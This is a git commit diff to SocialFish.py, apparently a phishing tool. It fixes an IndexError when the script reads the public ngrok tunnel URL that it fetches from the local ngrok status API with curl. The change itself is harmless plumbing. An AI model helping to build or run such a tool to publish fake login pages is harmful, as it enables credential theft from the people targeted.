17658d4ecaf4b089ba03793985c4c4722953775f
Alisson Moretto <33207993+A1S0N@users.noreply.github.com>
2018-02-08 14:28:17 -0200

    Fix IndexError: list index out of range

--- SocialFish.py
+++ SocialFish.py
@@ -179,7 +179,7 @@ def runNgrok():
     sleep(10)
     system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
     url = open('ngrok.url', 'r')
-    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.readlines()[0] + '{1}').format(CYAN, END, GREEN)
+    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.read() + '{1}').format(CYAN, END, GREEN)
     url.close()
 
 def runServer():
